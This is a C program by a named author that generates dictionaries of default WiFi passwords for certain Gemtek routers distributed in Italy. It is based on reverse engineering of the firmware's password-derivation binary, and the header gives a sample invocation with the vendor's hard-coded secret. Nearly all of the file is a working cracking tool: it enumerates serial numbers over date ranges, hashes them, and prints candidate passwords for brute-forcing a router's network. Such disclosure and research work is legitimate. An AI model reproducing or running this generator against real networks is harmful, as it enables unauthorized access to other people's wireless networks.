/* 
  Can be compiled with the following command:
      gcc gemtek-gen-dict.c -lcrypto -o gemtek-gen-dict

  Purpose of this program is to generate a dictionary with default
  wifi passwords of some Gemtek routers (tested on WVRTM-127ACN
  distributet in Italy by Linkem).

  The algorithm implemented on this program is based on reverse engineering
  of the binary /bin/assistant, included in the router firmware and root
  file system.

  A tipycal invocation of /bin/assistant to generate the default password
  is:

     # assistant -p "hO2PHGNmaX0Ww!v0eqD8" -w wifi -h "GMK170210005623" -s A8D9A6 \
         2> /dev/null | cut -c1-8 | tr 'A-Z' 'a-z'
     wsagj2zz

  Licensed under MIT License:

  Copyright (c) 2019, Valerio Di Giampietro, http://va.ler.io, v@ler.io

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/sha.h>
#include <getopt.h>
#include <time.h>
#include <ctype.h>

const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void usage(char *myname) {
  printf("usage: %s -s start_date -e end_date -a start_serial -z end_serial -m half_mac [ -n ]\n\n",myname);
  printf("  example: %s -s 171001 -e 171231 -a 0 -z 10000 -m A8D9A6\n\n",myname);
  printf("  %s will generate password dictionary based on the last 3 digits of the\n",myname);
  printf("  mac address and on the serial number generated. The serial number has\n");
  printf("  the format GMKyymmddNNNNNN and they will be generated based on the above options\n\n");
  printf("  -n add the serial number to the password generated (not useful for password cracking)\n");
  printf("  -h print this help\n");
}

void upper_string(char s[]) {
   int c = 0;
   
   while (s[c] != '\0') {
      if (s[c] >= 'a' && s[c] <= 'z') {
         s[c] = s[c] - 32;
      }
      c++;
   }
}

void lower_string(char s[]) {
  int c = 0;
   
  while (s[c] != '\0') {
    if (s[c] >= 'A' && s[c] <= 'Z') {
      s[c] = s[c] + 32;
    }
    c++;
  }
}

size_t b64_encoded_size(size_t inlen)
{
	size_t ret;

	ret = inlen;
	if (inlen % 3 != 0)
		ret += 3 - (inlen % 3);
	ret /= 3;
	ret *= 4;

	return ret;
}

char *b64_encode(const unsigned char *in, unsigned char *out, size_t len)
{
	size_t  elen;
	size_t  i;
	size_t  j;
	size_t  v;

	if (in == NULL || len == 0)
		return NULL;

	elen = b64_encoded_size(len);
	out[elen] = '\0';

	for (i=0, j=0; i<len; i+=3, j+=4) {
		v = in[i];
		v = i+1 < len ? v << 8 | in[i+1] : v << 8;
		v = i+2 < len ? v << 8 | in[i+2] : v << 8;

		out[j]   = b64chars[(v >> 18) & 0x3F];
		out[j+1] = b64chars[(v >> 12) & 0x3F];
		if (i+1 < len) {
			out[j+2] = b64chars[(v >> 6) & 0x3F];
		} else {
			out[j+2] = '=';
		}
		if (i+2 < len) {
			out[j+3] = b64chars[v & 0x3F];
		} else {
			out[j+3] = '=';
		}
	}

	return out;
}

char *wifipass(const unsigned char *serial, const unsigned char *halfmac, unsigned char *buf) {
  unsigned char passbin[6];
  unsigned char sha1bin[SHA_DIGEST_LENGTH];
  int i = 0;
  int j = 0;
  int lastpos = 0;
  int modulus = SHA_DIGEST_LENGTH;

  SHA1(serial, strlen(serial), sha1bin);
  if (sha1bin[0] != 0) {
    for (i=1; i<SHA_DIGEST_LENGTH; i++) {
      if (sha1bin[i] == 0) {
	modulus = i;
	break;
      }
    }
  }
    
    
  for (i=0; i<6; i++) {
    j= halfmac[i]- '0' + lastpos;
    j= j % modulus;
    passbin[i]=sha1bin[j];
    lastpos=j;
  }
    
  b64_encode(passbin,buf,6);
  lower_string(buf);
  return buf;
}

/* check_date in format yymmdd returns 1 if errors*/
int check_date (char *date) {
  int retval = 1;
  int i =0;
  char smm[3]="  ";
  char sdd[3]="  ";
  int  mm;
  int  dd;
  int  daymonths[12]={31,28,31,30,31,30,31,31,30,31,30,31};
  
  /* check length */
  if (strlen(date) != 6 ) {
    return(retval);
  }
  /* check digits */
  for (i=0; i<6; i++) {
    if (! isdigit(date[i])) {
      return(retval);
    }
  }
  /* check month */
  strncpy(smm,date+2,2);
  mm=atoi(smm);
  if ((mm > 12) || (mm < 1)) {
    return(retval);
  }
  /* check day */
  strncpy(sdd,date+4,2);
  dd=atoi(sdd);
  if ((dd > daymonths[mm-1]) || (dd < 1)) {
    return(retval);
  }
  
  /* all check passed, return ok */
  retval = 0;
  return(retval);
}

/* check_options returns 1 if errors */
int check_options(char *sdate, char *edate,
		  char *sserial, char *eserial,
		  char *halfmac) {
  int retval = 1;
  int i = 0;

  /* check sdate and edate */
  if (check_date(sdate)) {
    fprintf(stderr,"Error in option -s: %s has wrong format\n",sdate);
    return(retval);
  } 

  if (check_date(edate)) {
    fprintf(stderr,"Error in option -d: %s has wrong format\n",edate);
    return(retval);
  }

  if (atoi(sdate) > atoi(edate)) {
    fprintf(stderr,"Error in options, end date mast be grater then start date\n");
    return(retval);
  }

  /* check sserial and eserial */
  for (i=0; i<strlen(sserial); i++) {
    if (! isdigit(sserial[i])) {
      fprintf(stderr, "Error in option -a, %s must be a postive integer\n",sserial);
      return(retval);
    }
  }

  for (i=0; i<strlen(eserial); i++) {
    if (! isdigit(eserial[i])) {
      fprintf(stderr, "Error in option -z, %s must be a postive integer\n",eserial);
      return(retval);
    }
  }

  if (atoi(sserial) > atoi(eserial)) {
    fprintf(stderr,"Error in options, start serial must be greater than end serial\n");
    return(retval);
  }

  /* check half mac */
  if (strlen(halfmac) != 6) {
    fprintf(stderr,"Error in option -m, the parameter %s must be a 6 digit hex string\n",halfmac);
    return(retval);
  }

  for (i=0; i<strlen(halfmac); i++) {
    if (! isxdigit(halfmac[i])) {
      fprintf(stderr, "Error in option -m, %s must be a 6 digit hex string\n",halfmac);
      return(retval);
    }
  }
  
  /* all check passed returns ok */
  retval = 0;
  return(retval);
}

/* next_date increment by one day the date string */
/* example: 170131 -> 170201*/
void next_date (char *date) {
  char olddate[7];
  int y = 0;
  int m = 0;
  int d = 0;
  char sy[3]="  ";
  char sm[3]="  ";
  char sd[3]="  ";
  struct tm *t,tdata;
  t=&tdata;
  time_t tsec = 0;  /* Seconds since the epoch */
  t->tm_sec = 0;    /* Seconds (0-60) */
  t->tm_min = 0;    /* Minutes (0-59) */
  t->tm_hour = 12;  /* Hours (0-23) */
  t->tm_mday = 1;   /* Day of the month (1-31) */
  t->tm_mon = 0;    /* Month (0-11) */
  t->tm_year = 0;   /* Year - 1900 */

  strcpy(olddate,date);
  // fprintf(stderr,"---> next_date input:  %s\n",date);
  strncpy(sy,date,2);
  strncpy(sm,date+2,2);
  strncpy(sd,date+4,2);
  y = atoi(sy);
  m = atoi(sm);
  d = atoi(sd);
  t->tm_year= 100 + y;
  t->tm_mon=m-1;
  t->tm_mday=d;
  tsec=mktime(t);
  tsec+= 3600 * 24;
  t=gmtime(&tsec);
  strftime(date,7,"%y%m%d",t);
  //fprintf(stderr,"---> next_date output: %s\n",date);
  if (strcmp(olddate,date) == 0) {
    fprintf(stderr,"Unexpected internal error in incrementing date\n");
    exit(1);
  }
}

int main(int argn, char *argv[]) {
    int i = 0;
    int j = 0;
    int oidx = 0;     /* option index */
    int noptions = 0; /* number of needed options are 5 */
    char *sdate = NULL;
    char *edate = NULL;
    char *sserial = NULL;
    char *eserial = NULL;
    char *halfmac = NULL;
    char currdate[7] = "      ";
    
    char          buf[SHA_DIGEST_LENGTH*2];
    char          bufpass[6];
    unsigned char passb64[20];
    int  startserial= 0;
    int  currserial = 0;
    int  printedserial = 0;
    int  endserial  = 0;
    char currsn[20]   = "GMK170210005623";
    int  printserial  = 0;
    int  ndays        = 0;
    int  nday         = 0;
    int  daytoprint   = 0;
    char *currdateptr = 0;
    char *basedateptr = 0;


    /* process options */
    srand(time(NULL));
    
    while (( oidx = getopt(argn, argv, "s:e:a:z:m:nh")) != -1)
    
    switch(oidx) {
    case 's':
      sdate = optarg;
      noptions++;
      break;
    case 'e':
      edate = optarg;
      noptions++;
      break;
    case 'a':
      sserial = optarg;
      noptions++;
      break;
    case 'z':
      eserial = optarg;
      noptions++;
      break;
    case 'm':
      halfmac = optarg;
      upper_string(halfmac);
      noptions++;
      break;
    case 'n':
      printserial=1;
      break;
    case 'h':
      usage((char *)argv[0]);
      return(0);
    default:
      printf("Invalid option\n");
      usage((char *)argv[0]);
      return(0);
    }

    if (noptions < 5) {
      usage((char *)argv[0]);
      return 1;
    }
    
    if (check_options(sdate,edate,sserial,eserial,halfmac)) {
      fprintf(stderr,"Error in options\n");
      usage((char *)argv[0]);
      return 1;
    }
    
    /* print input options */
    fprintf(stderr,"sdate - start date:             %s\n",sdate);
    fprintf(stderr,"edate - end date:               %s\n",edate);
    fprintf(stderr,"sserial - start serial:         %s\n",sserial);
    fprintf(stderr,"eserial - end serial:           %s\n",eserial);
    fprintf(stderr,"halfmac - last 3 mac digits:    %s\n",halfmac);

    strcpy(currdate,sdate);
    startserial= atoi(sserial);
    currserial = startserial;
    endserial  = atoi(eserial);
    ndays = 0;

    /* count number of days */
    while (atoi(edate) >= atoi(currdate)) {
      ndays++;
      next_date(currdate);
    }
    fprintf(stderr,"---> tot number of days: %i\n",ndays);
    strcpy(currdate,sdate);

    /* allocate memory for days string */
    basedateptr=malloc(sizeof(char) * ndays * 7);
    currdateptr=basedateptr;
    
    /* write day string to memory */
    for (nday = 0; nday < ndays; nday ++) {
      strcpy(currdateptr,currdate);
      /* fprintf(stderr,"---> date: %s\n",currdateptr); */
      currdateptr+=7;
      next_date(currdate);
    }
    
    for (currserial=startserial; currserial <= endserial; currserial++) {
      currdateptr = basedateptr;
      daytoprint = rand() % ndays;
      for (nday=0; nday < ndays; nday++) {
    	sprintf(currsn,"%s%s%06u","GMK",currdateptr,currserial);
	if ((currserial % 200) == 0) {
	  if ((printedserial != currserial) && (nday == daytoprint)) {
	    fprintf(stderr,"---> %s\r",currsn);
	    printedserial = currserial;
	  }
	}
    	wifipass(currsn,halfmac,passb64);
    	if (printserial) {
    	  fprintf(stdout,"%s ",currsn);
    	}
    	fprintf(stdout, "%s\n",passb64);
	currdateptr+=7;
      }
    }
    fprintf(stderr,"\n");
    return (0);

}
